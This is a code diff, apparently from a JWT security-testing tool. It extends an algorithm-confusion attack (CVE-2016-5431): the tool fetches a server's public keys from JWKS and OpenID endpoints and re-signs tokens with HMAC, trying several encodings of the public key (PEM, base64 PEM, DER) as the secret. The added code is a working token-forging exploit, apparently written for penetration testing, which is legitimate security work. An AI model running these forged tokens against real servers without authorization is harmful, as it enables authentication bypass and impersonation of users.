@@ -885,7 +885,7 @@ async function discoverPublicKeys(fetcher, baseUrl, extraPaths = []) {
         const body = await fetcher(url);
         const extracted = extractPublicKeyPem(body);
         if (!extracted) return null;
-        return { url, publicKeyPem: extracted.pem, kind: extracted.kind };
+        return { url, publicKeyPem: extracted.pem, kind: extracted.kind, content: body };
       })
     );
     for (const r of settled) {
@@ -893,6 +893,17 @@ async function discoverPublicKeys(fetcher, baseUrl, extraPaths = []) {
     }
   }
   return found;
+}
+async function tryJwks(fetcher, url) {
+  try {
+    const body = await fetcher(url);
+    const parsed = JSON.parse(body);
+    if (Array.isArray(parsed.keys) && parsed.keys.length > 0) {
+      return { url, keys: parsed.keys, content: body };
+    }
+  } catch {
+  }
+  return null;
 }
 async function discoverJWKS(fetcher, baseUrl, extraPaths = []) {
   let origin;
@@ -907,11 +918,11 @@ async function discoverJWKS(fetcher, baseUrl, extraPaths = []) {
   const seenUrls = /* @__PURE__ */ new Set();
   try {
     const jwksUri = await fetchOpenIDConfig(fetcher, origin);
-    if (jwksUri) {
-      const jwks = await fetchJWKS(fetcher, jwksUri);
-      if (jwks && jwks.keys.length > 0 && !seenUrls.has(jwksUri)) {
+    if (jwksUri && !seenUrls.has(jwksUri)) {
+      const jwks = await tryJwks(fetcher, jwksUri);
+      if (jwks) {
         seenUrls.add(jwksUri);
-        results.push({ url: jwksUri, keys: jwks.keys });
+        results.push(jwks);
       }
     }
   } catch {
@@ -919,12 +930,7 @@ async function discoverJWKS(fetcher, baseUrl, extraPaths = []) {
   for (let i = 0; i < pathsToTry.length; i += 5) {
     const batch = pathsToTry.slice(i, i + 5);
     const settled = await Promise.allSettled(
-      batch.map(async (path) => {
-        const url = `${origin}${path}`;
-        const jwks = await fetchJWKS(fetcher, url);
-        if (jwks && jwks.keys.length > 0) return { url, keys: jwks.keys };
-        return null;
-      })
+      batch.map((path) => tryJwks(fetcher, `${origin}${path}`))
     );
     for (const r of settled) {
       if (r.status === "fulfilled" && r.value && !seenUrls.has(r.value.url)) {
@@ -951,53 +957,78 @@ var ALG_CONFUSION_MAP = {
 function isAsymmetricAlg(alg) {
   return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
 }
-function publicKeyPemToSecret(keyPem, originalAlg) {
-  if (originalAlg.startsWith("ES")) {
-    return ecPublicKeyPemToRawBytes(keyPem);
-  }
-  return publicKeyPemToRawBytes(keyPem);
+function secretVariants(keyPem, originalAlg) {
+  const pem = keyPem.replace(/\r\n/g, "\n");
+  const pemNoTrailingLF = pem.replace(/\n+$/, "");
+  const pemBase64 = Buffer.from(pem, "utf8").toString("base64");
+  const variants = [
+    // Primary: the PEM string exactly as a typical key file / JWK→PEM export
+    // (64-char wrapped, trailing newline). This is the net result of the
+    // "base64-encode the PEM into a symmetric JWK `k`, then sign" workflow,
+    // because `k` is base64-decoded back to the PEM before HMAC.
+    { secret: Buffer.from(pem, "utf8"), label: "PEM" },
+    // Some servers strip / lack the trailing newline.
+    { secret: Buffer.from(pemNoTrailingLF, "utf8"), label: "PEM (no trailing LF)" },
+    // Literal base64(PEM) — for tools/servers that use the `k` value undecoded.
+    { secret: Buffer.from(pemBase64, "utf8"), label: "base64(PEM)" },
+    // Raw DER bytes — the previous behavior, kept only as a last-resort fallback.
+    {
+      secret: originalAlg.startsWith("ES") ? ecPublicKeyPemToRawBytes(pem) : publicKeyPemToRawBytes(pem),
+      label: "DER"
+    }
+  ];
+  return variants;
 }
-function makeAttack(parsed, hmacAlg, publicKeyPem, sourceDesc) {
+function makeAttack(parsed, hmacAlg, secret, sourceDesc, variantLabel) {
   const header = { ...parsed.header, alg: hmacAlg };
   delete header.jku;
   delete header.jwk;
   delete header.x5u;
   delete header.x5c;
   delete header.kid;
-  const secret = publicKeyPemToSecret(publicKeyPem, parsed.header.alg);
   const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
   return {
     id: nanoid(),
     technique: "algConfusion",
-    techniqueName: `Algorithm Confusion (${parsed.header.alg} \u2192 ${hmacAlg}, ${sourceDesc})`,
-    description: `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's RSA/EC public key (${sourceDesc}) as the HMAC secret. Vulnerable servers using the same key object for both RS/ES and HS verification will accept this token.`,
+    techniqueName: `Algorithm Confusion (${parsed.header.alg} \u2192 ${hmacAlg}, ${variantLabel})`,
+    description: `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's public key (${sourceDesc}) as the HMAC secret, encoded as ${variantLabel}. Vulnerable servers that use the same key material for both RS/ES and HS verification will accept this token.`,
     modifiedJWT: jwt,
     timestamp: Date.now()
   };
 }
-function buildAlgConfusionForKeys(parsed, keyPems, sourceDesc) {
-  const originalAlg = parsed.header.alg;
-  if (!isAsymmetricAlg(originalAlg)) return [];
-  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+function attacksForKey(parsed, hmacAlg, originalAlg, keyPem, sourceDesc, seen) {
   const out = [];
-  for (const pem of keyPems) {
+  for (const v of secretVariants(keyPem, originalAlg)) {
     try {
-      out.push(makeAttack(parsed, hmacAlg, pem, sourceDesc));
+      const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
+      if (seen.has(attack.modifiedJWT)) continue;
+      seen.add(attack.modifiedJWT);
+      out.push(attack);
     } catch {
     }
   }
   return out;
 }
+function buildAlgConfusionForKeys(parsed, keyPems, sourceDesc) {
+  const originalAlg = parsed.header.alg;
+  if (!isAsymmetricAlg(originalAlg)) return [];
+  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  const seen = /* @__PURE__ */ new Set();
+  const out = [];
+  for (const pem of keyPems) {
+    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
+  }
+  return out;
+}
+var MAX_DISCOVERY_CONTENT = 16384;
 async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = [], onDiscovery, fetcher) {
   const originalAlg = parsed.header.alg;
   if (!isAsymmetricAlg(originalAlg)) return [];
   const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
   const results = [];
+  const seen = /* @__PURE__ */ new Set();
   const addKey = (pem, source) => {
-    try {
-      results.push(makeAttack(parsed, hmacAlg, pem, source));
-    } catch {
-    }
+    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
   };
   if (config.customPublicKeyPem) {
     addKey(config.customPublicKeyPem, "configured public key");
@@ -1051,7 +1082,13 @@ ${certDer.toString("base64").match(/.{1,64}/g).join("\n")}
         for (const pem of pems) {
           addKey(pem, `JWKS (${result.url})`);
         }
-        onDiscovery?.({ url: result.url, source: "JWKS endpoint", keyCount: pems.length });
+        onDiscovery?.({
+          url: result.url,
+          source: "JWKS endpoint",
+          keyCount: pems.length,
+          content: result.content.slice(0, MAX_DISCOVERY_CONTENT),
+          pems
+        });
       }
     } catch {
     }
@@ -1059,7 +1096,13 @@ ${certDer.toString("base64").match(/.{1,64}/g).join("\n")}
       const keys = await discoverPublicKeys(fetcher, baseUrl);
       for (const k of keys) {
         addKey(k.publicKeyPem, `${k.kind} at ${k.url}`);
-        onDiscovery?.({ url: k.url, source: k.kind, keyCount: 1 });
+        onDiscovery?.({
+          url: k.url,
+          source: k.kind,
+          keyCount: 1,
+          content: k.content.slice(0, MAX_DISCOVERY_CONTENT),
+          pems: [k.publicKeyPem]
+        });
       }
     } catch {
     }
